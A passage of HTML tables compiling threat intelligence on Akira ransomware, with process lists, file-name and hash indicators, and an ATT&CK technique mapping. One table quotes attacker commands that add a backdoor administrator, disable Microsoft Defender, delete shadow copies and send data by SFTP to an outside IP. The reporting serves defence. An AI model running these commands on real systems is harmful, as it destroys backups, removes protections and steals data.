+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">sihost.exe</span></p>
+</td>
+<td style="width: 121.45pt; border: solid #DDDDDD 1.0pt; border-left: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">frontdrvhost.exe</span></p>
+</td>
+</tr>
+<tr style="height: 21.3pt;">
+<td style="width: 102.25pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><amp-img alt="Screenshot 2024-05-02 at 9.25.14 AM.png" class="i-amphtml-element i-amphtml-layout-intrinsic i-amphtml-layout-size-defined i-amphtml-built" height="16" i-amphtml-layout="intrinsic" layout="intrinsic" lightbox="lightbox" on="tap:amp-lightbox-gallery.activate" src="https://images2.cmp.optimizely.com/Zz1hODNjYzYwMDA4ODgxMWVmOGJhYjYyYzdjYTMxOGZiMQ==" width="64"><i-amphtml-sizer class="i-amphtml-sizer" slot="i-amphtml-svc"></i-amphtml-sizer></amp-img></p>
+</td>
+<td style="width: 102.25pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">dwm.exe</span></p>
+</td>
+<td style="width: 115.0pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">LogonUI.exe</span></p>
+</td>
+<td style="width: 121.45pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">SearchUI.exe</span></p>
+</td>
+</tr>
+<tr style="height: 20.7pt;">
+<td style="width: 102.25pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">lsass.exe</span></p>
+</td>
+<td style="width: 102.25pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">csrss.exe</span></p>
+</td>
+<td style="width: 115.0pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">smss.exe</span></p>
+</td>
+<td style="width: 121.45pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">winlogon.exe</span></p>
+</td>
+</tr>
+<tr style="height: 20.7pt;">
+<td style="width: 102.25pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">services.exe</span></p>
+</td>
+<td style="width: 102.25pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">conhost.exe</span></p>
+</td>
+<td style="width: 115.0pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">System</span></p>
+</td>
+<td style="width: 121.45pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">System Idle Process</span></p>
+</td>
+</tr>
+<tr style="height: 20.7pt;">
+<td style="width: 102.25pt; border: solid #DDDDDD 1.0pt; border-top: none; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Secure System</span></p>
+</td>
+<td style="width: 102.25pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Registry</span></p>
+</td>
+<td style="width: 115.0pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Memory Compression</span></p>
+</td>
+<td style="width: 121.45pt; border-top: none; border-left: none; border-bottom: solid #DDDDDD 1.0pt; border-right: solid #DDDDDD 1.0pt; padding: 1.5pt 1.5pt .7pt 1.5pt;" valign="top">
+<p style="margin: 0in 0in 6pt; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">wininit.exe</span></p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://securityintelligence.com/x-force/spotlight-akira-ransomware-x-force/'>https://securityintelligence.com/x-force/spotlight-akira-ransomware-x-force/</a></p><br><table border="1" cellpadding="0" cellspacing="0" class="MsoTableGrid" style="width: 1181px; border-collapse: collapse; border: none; height: 174px;">
+<tbody>
+<tr style="height: .9pt;">
+<td nowrap="" style="width: 574.297px; border: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; text-align: center; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><b><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Indicator</span></b></p>
+</td>
+<td style="width: 63.8594px; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; text-align: center; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><b><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Indicator Type</span></b></p>
+</td>
+<td nowrap="" style="width: 610.961px; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; text-align: center; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><b><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif;">Context</span></b></p>
+</td>
+</tr>
+<tr style="height: .9pt;">
+<td nowrap="" style="width: 574.297px; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: #1d1c1d;">*.akira</span></p>
+</td>
+<td style="width: 63.8594px; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; text-align: center; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">File Name</span></p>
+</td>
+<td nowrap="" style="width: 610.961px; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">Appendage to filenames left after encryption is complete</span></p>
+</td>
+</tr>
+<tr style="height: .9pt;">
+<td nowrap="" style="width: 574.297px; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: #1d1c1d;">akira_readme.txt</span></p>
+</td>
+<td style="width: 63.8594px; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; text-align: center; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">File Name</span></p>
+</td>
+<td nowrap="" style="width: 610.961px; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">Name of text file left after encryption</span></p>
+</td>
+</tr>
+<tr style="height: .9pt;">
+<td nowrap="" style="width: 574.297px; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: #1d1c1d;">Log-&lt;Day&gt;-&lt;Month&gt;-&lt;Year&gt;-&lt;Hour&gt;-&lt;Minute&gt;-&lt;Second&gt;.txt</span></p>
+</td>
+<td style="width: 63.8594px; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; text-align: center; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">File Name</span></p>
+</td>
+<td nowrap="" style="width: 610.961px; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">Name of log file left after encryption</span></p>
+</td>
+</tr>
+<tr style="height: .9pt;">
+<td nowrap="" style="width: 574.297px; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: #1d1c1d;">powershell.exe -Command “Get-WmiObject Win32_Shadowcopy | Remove-WmiObject”</span></p>
+<p style="margin: 0in; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: #1d1c1d;"> </span></p>
+</td>
+<td style="width: 63.8594px; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; text-align: center; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">Process Name</span></p>
+</td>
+<td nowrap="" style="width: 610.961px; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top">
+<p style="margin: 0in; line-height: normal; font-size: 11pt; font-family: Calibri, sans-serif;"><span style="font-size: 12.0pt; font-family: 'Times New Roman', serif; color: black;">Powershell command for removing shadow copy objects, used to remove potential backup files</span></p>
+</td>
+</tr>
+</tbody>
+</table><br><br><p>Source: <a href='https://securityintelligence.com/x-force/spotlight-akira-ransomware-x-force/'>https://securityintelligence.com/x-force/spotlight-akira-ransomware-x-force/</a></p><br><table border="1" cellpadding="0" cellspacing="0">
+<tbody><tr><td valign="top" width="312"><p><b>Weapons</b></p>
+</td>
+<td valign="top" width="312"><p>Ransomware, OpenSSH, NetScan, Advanced IP Scanner, AnyDesk</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>Attack Vector</b></p>
+</td>
+<td valign="top" width="312"><p>Abuse of Valid Credentials</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>Network Infrastructure</b></p>
+</td>
+<td valign="top" width="312"><p>SFTP</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>Targets</b></p>
+</td>
+<td valign="top" width="312"><p>Airline, Transportation</p>
+</td>
+</tr></tbody></table><br><br><p>Source: <a href='https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry'>https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry</a></p><br><table border="1" cellpadding="0" cellspacing="0">
+<tbody><tr><td valign="top" width="312"><p><b>Hashes (md5, sha-256)</b></p>
+</td>
+<td valign="top" width="312"><p>77a243cb73f6bdd610eeb10786b752fb</p>
+<p>9b42decb7ea825b939fc36ab924e0c80324e0a4eccb4c371eac60a8672af9603</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>ITW File Name</b></p>
+</td>
+<td valign="top" width="312"><p>w.exe</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>Compilation Stamp</b></p>
+</td>
+<td valign="top" width="312"><p>Thu Dec 28 14:49:57 2023 | UTC</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>File Type/Signature</b></p>
+</td>
+<td valign="top" width="312"><p>PE32+ executable (GUI) x86-64, for MS Windows</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>File Size</b></p>
+</td>
+<td valign="top" width="312"><p>1029120</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>Compiler Name/Version</b></p>
+</td>
+<td valign="top" width="312"><p>Microsoft Visual C/C++(19.36.32822)[LTCG/C++]</p>
+</td>
+</tr></tbody></table><br><br><p>Source: <a href='https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry'>https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry</a></p><br><table border="1" cellpadding="0" cellspacing="0">
+<tbody><tr><td valign="top" width="312"><p><b>Tool</b></p>
+</td>
+<td valign="top" width="312"><p><b>SHA256</b></p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>NetScan</b></p>
+</td>
+<td valign="top" width="312"><p>A8A7FDBBC688029C0D97BF836DA9ECE926A85E78986D0E1EBD9B3467B3A72258</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>Advanced IP Scanner</b></p>
+</td>
+<td valign="top" width="312"><p>EC8252A333F68865160E26DC95607F2C49AF00F78C657F7F8417AB9D86E90BF7</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>WinRAR</b></p>
+</td>
+<td valign="top" width="312"><p>4EBA4D465F8F5DF529F986F89C80B3AB93F6AB86A6DA236D7B129FC0228AF29A</p>
+<p>5ACE2A64C9E3BA1911627DF1C335AF9800AA13064ABC4D7787B7C65B94958971</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>OpenSSH</b></p>
+</td>
+<td valign="top" width="312"><p>6F31CF7A11189C683D8455180B4EE6A60781D2E3F3AADF3ECC86F578D480CFA9</p>
+</td>
+</tr><tr><td valign="top" width="312"><p><b>AnyDesk</b></p>
+</td>
+<td valign="top" width="312"><p>1CDAFBE519F60AAADB4A92E266FFF709129F86F0C9EE595C45499C66092E0499</p>
+</td>
+</tr><tr><td valign="top" width="118"><p><b>WinSCP</b></p>
+</td>
+<td valign="top" width="505"><p>026E8823B1885C0D58E48BDA8B0C4501710D181DCF603970CDBFB5782F18281D</p>
+</td>
+</tr></tbody></table><br><br><p>Source: <a href='https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry'>https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry</a></p><br><table border="1" cellpadding="0" cellspacing="0">
+<tbody><tr><td valign="top" width="624">net user backup P@ssw0rd /add<br/>
+net localgroup<br/>
+net localgroup Administradores backup /add</td>
+</tr><tr><td valign="top" width="624"><p>quser</p>
+</td>
+</tr><tr><td valign="top" width="624"><p>route print</p>
+</td>
+</tr><tr><td valign="top" width="624">takeown /f "&lt;backup path here&gt;" /r /d s<br/>
+WinRAR.exe a -m4 -v3g -tn365d -n*.bmp -n*.doc -n*.docx -n*.xls -n*.xlsx -n*.pdf -n*.txt<br/>
+    -hpcompanypass "\\&lt;remote backup path&gt;\Wallpapers\Sup\\Data.rar" "F:\&lt;data folder&gt;"</td>
+</tr><tr><td valign="top" width="624"><p>winscp.com /command "open sftp://datadatauser@77[.]247[.]126[.]158:37654"</p>
+</td>
+</tr><tr><td valign="top" width="624">net user &lt;username&gt; P@ssw0rd!91<br/>
+net user &lt;username&gt; P@ssw0rd!91 /dom<br/>
+net user &lt;username&gt; P@ssw0rd!91 /active:no /dom<br/>
+net user &lt;username&gt; /del /dom</td>
+</tr><tr><td valign="top" width="624">Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableArchiveScanning $true -DisableScriptScanning<br/>
+$true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -MAPSReporting Disabled -SubmitSamplesConsent 2<br/>
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v C:\Windows\ /t reg_dword /d 0 /f<br/>
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f<br/>
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f<br/>
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f<br/>
+/c Add-MpPreference -ExclusionPath C:\ProgramData, C:\Windows<br/>
+sc config WinDefend start= disabled<br/>
+sc stop WinDefend<br/>
+Set-MpPreference -DisableRealtimeMonitoring True</td>
+</tr><tr><td valign="top" width="624"><p>powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"</p>
+</td>
+</tr></tbody></table><br><br><p>Source: <a href='https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry'>https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry</a></p><br><table border="1" cellpadding="0" cellspacing="0">
+<tbody><tr><td valign="top" width="208"><p><b>Tactic </b></p>
+</td>
+<td valign="top" width="208"><p><b>Technique </b></p>
+</td>
+<td valign="top" width="208"><p><b>Sub-Technique Name / Context </b></p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Resource Development </b></p>
+</td>
+<td valign="top" width="208"><p>Obtain Capabilities: Tool – T1588.002</p>
+</td>
+<td valign="top" width="208"><p>Use publicly-available tools: Advanced IP Scanner, Netscan.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Initial Access, Persistence </b></p>
+</td>
+<td valign="top" width="208"><p>External Remote Services T1133<u> </u></p>
+</td>
+<td valign="top" width="208"><p>Use of SSH and RDP.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Initial Access, Persistence </b></p>
+</td>
+<td valign="top" width="208"><p>Valid Accounts T1078</p>
+</td>
+<td valign="top" width="208"><p> </p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Initial Access </b></p>
+</td>
+<td valign="top" width="208"><p>Exploit Public-Facing Application - T1190</p>
+</td>
+<td valign="top" width="208"><p>Potential exploitation of Veeam backup server vulnerabilities: CVE-2023-27532, CVE-2020-3259 and CVE-2023-20269.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Execution </b></p>
+</td>
+<td valign="top" width="208"><p>Command and Scripting Interpreter: PowerShell Execution – T1059.001</p>
+</td>
+<td valign="top" width="208"><p>Utilizes the Get-LocalUser cmdlet to display information about local user accounts and to delete shadow copies.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Execution </b></p>
+</td>
+<td valign="top" width="208"><p>Windows Management Instrumentation – T1047</p>
+</td>
+<td valign="top" width="208"><p>Utilizes the “Win32_Shadhowcopy” WMI Class to retrieve information about shadows copies.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Execution </b></p>
+</td>
+<td valign="top" width="208"><p>User Execution: Malicious File – T1204.001</p>
+</td>
+<td valign="top" width="208"><p>Executes Akira ransomware on victim’s machine.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Persistence </b></p>
+</td>
+<td valign="top" width="208"><p>Create Account: Domain Account T1136.002</p>
+</td>
+<td valign="top" width="208"><p>Create “backup” account.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Persistence </b></p>
+</td>
+<td valign="top" width="208"><p>Create Account: Local Account T1136.001</p>
+</td>
+<td valign="top" width="208"><p>Create “backup” account.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Privilege Escalation </b></p>
+</td>
+<td valign="top" width="208"><p>Account Manipulation - T1098</p>
+</td>
+<td valign="top" width="208"><p>Add backup user to the Administrators group.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Defense Evasion </b></p>
+</td>
+<td valign="top" width="208"><p>Disable or Modify Tools T1562.001</p>
+</td>
+<td valign="top" width="208"><p>Disable MSDefender, Access local AV UI.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Defense Evasion </b></p>
+</td>
+<td valign="top" width="208"><p>File and Directory Permissions Modification: Windows File and Directory Permissions Modification – T1222.001</p>
+</td>
+<td valign="top" width="208"><p>Takes ownership of the backup directory and its contents.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Defense Evasion </b></p>
+</td>
+<td valign="top" width="208"><p>Modify Registry – T1112</p>
+</td>
+<td valign="top" width="208"><p>Disable Microsoft Defender by modifying the registry key.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Discovery </b></p>
+</td>
+<td valign="top" width="208"><p>Domain Trust Discovery T1482</p>
+</td>
+<td valign="top" width="208"><p>Netscan</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Discovery </b></p>
+</td>
+<td valign="top" width="208"><p>Remote System Discovery T1018</p>
+</td>
+<td valign="top" width="208"><p>Advanced IP Scanner, Netscan.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Discovery </b></p>
+</td>
+<td valign="top" width="208"><p>System Network Configuration Discovery T1016</p>
+</td>
+<td valign="top" width="208"><p>Advanced IP Scanner, Netscan.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Discovery </b></p>
+</td>
+<td valign="top" width="208"><p>Permission Groups Discovery: Local Groups - T1069</p>
+</td>
+<td valign="top" width="208"><p>Net localgroup</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Discovery </b></p>
+</td>
+<td valign="top" width="208"><p>File and Directory Discovery – T1083</p>
+</td>
+<td valign="top" width="208"><p>Enumerates content of the “ProgramData” folder.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Discovery </b></p>
+</td>
+<td valign="top" width="208"><p>Account Discovery: Local Account Discovery – T1087.001</p>
+</td>
+<td valign="top" width="208"><p>Discover Local Account information using Get-LocalUser.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Lateral Movement </b></p>
+</td>
+<td valign="top" width="208"><p>Remote Desktop Protocol T1021.001</p>
+</td>
+<td valign="top" width="208"><p>Accessing RDP via Remmina.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Lateral Movement </b></p>
+</td>
+<td valign="top" width="208"><p>SMB/Windows Admin Shares T1021.002</p>
+</td>
+<td valign="top" width="208"><p>SMBExec</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Lateral Movement </b></p>
+</td>
+<td valign="top" width="208"><p>SSH T1021.004</p>
+</td>
+<td valign="top" width="208"><p> </p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Lateral Movement </b></p>
+</td>
+<td valign="top" width="208"><p>Lateral Tool Transfer – T1570</p>
+</td>
+<td valign="top" width="208"><p>Deploys ransomware on various hosts.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Collection </b></p>
+</td>
+<td valign="top" width="208"><p>Archive via Utility T1560.001</p>
+</td>
+<td valign="top" width="208"><p>WinRAR</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Command and Control </b></p>
+</td>
+<td valign="top" width="208"><p>Ingress Tool Transfer – T1105</p>
+</td>
+<td valign="top" width="208"><p>Downloads Akira ransomware from an external source into the compromised environment.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Command and Control </b></p>
+</td>
+<td valign="top" width="208"><p>Remote Access Software – T1219</p>
+</td>
+<td valign="top" width="208"><p>Installs legitimate utility AnyDesk on different systems.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Exfiltration </b></p>
+</td>
+<td valign="top" width="208"><p>Exfiltration Over Alternative Protocol T1048</p>
+</td>
+<td valign="top" width="208"><p>WinSCP/SFTP</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Exfiltration </b></p>
+</td>
+<td valign="top" width="208"><p>Transfer Data to Cloud Account T1537</p>
+</td>
+<td valign="top" width="208"><p>AnyDesk</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Impact </b></p>
+</td>
+<td valign="top" width="208"><p>Account Access Removal T1531</p>
+</td>
+<td valign="top" width="208"><p>Removal of user accounts.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Impact </b></p>
+</td>
+<td valign="top" width="208"><p>Data Encryption for Impact T1486</p>
+</td>
+<td valign="top" width="208"><p>Encrypt data using Akira ransomware.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Impact </b></p>
+</td>
+<td valign="top" width="208"><p>Inhibit System Recovery T1490</p>
+</td>
+<td valign="top" width="208"><p>Delete Shadow files.</p>
+</td>
+</tr><tr><td valign="top" width="208"><p><b>Impact </b></p>
+</td>
+<td valign="top" width="208"><p>Service Stop – T1489</p>
+</td>
+<td valign="top" width="208"><p>Stops WinDefend service.</p>
+</td>
+</tr></tbody></table><br><br><p>Source: <a href='https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry'>https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry</a></p><br><table _ngcontent-dej-c114=""><thead _ngcontent-dej-c167=""><tr _ngcontent-dej-c167=""><!-- --><th _ngcontent-dej-c167="" class="clickable ng-star-inserted" style="width: 115px;"><div _ngcontent-dej-c167="" class="column-header-container"><div _ngcontent-dej-c167="" class="clickable">type</div><otx-table-sort-icon _ngcontent-dej-c167="" _nghost-dej-c112=""><div _ngcontent-dej-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-dej-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-dej-c167="" class="clickable ng-star-inserted" style="width: 470px;"><div _ngcontent-dej-c167="" class="column-header-container"><div _ngcontent-dej-c167="" class="clickable">indicator</div><otx-table-sort-icon _ngcontent-dej-c167="" _nghost-dej-c112=""><div _ngcontent-dej-c112="" class="sort-icon ng-star-inserted"><!-- --><i _ngcontent-dej-c112="" class="fa fa-sort ng-star-inserted"></i><!-- --><!-- --></div><!-- --><!-- --></otx-table-sort-icon></div></th><!-- --><th _ngcontent-dej-c167="" class="clickable hidden-xs hidden-md hidden-sm ng-star-inserted" style="width: 150px;"><div _ngcontent-dej-c167="" 